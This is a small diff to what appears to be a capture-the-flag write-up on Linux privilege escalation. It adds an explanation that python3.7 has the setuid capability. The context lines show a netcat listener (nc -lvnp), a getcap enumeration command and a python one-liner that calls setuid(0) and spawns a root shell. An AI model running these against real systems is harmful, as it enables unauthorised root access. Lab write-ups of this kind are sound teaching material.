@@ -75,7 +75,7 @@ nc -lvnp 6999
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
-Running `getcap -r / 2>/dev/null` shows that python3.7 has its capsetuid+ep
+Running `getcap -r / 2>/dev/null` shows that python3.7 has its capsetuid+ep. This mean we can use python to set our userid to root
 
 ```shell
 python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
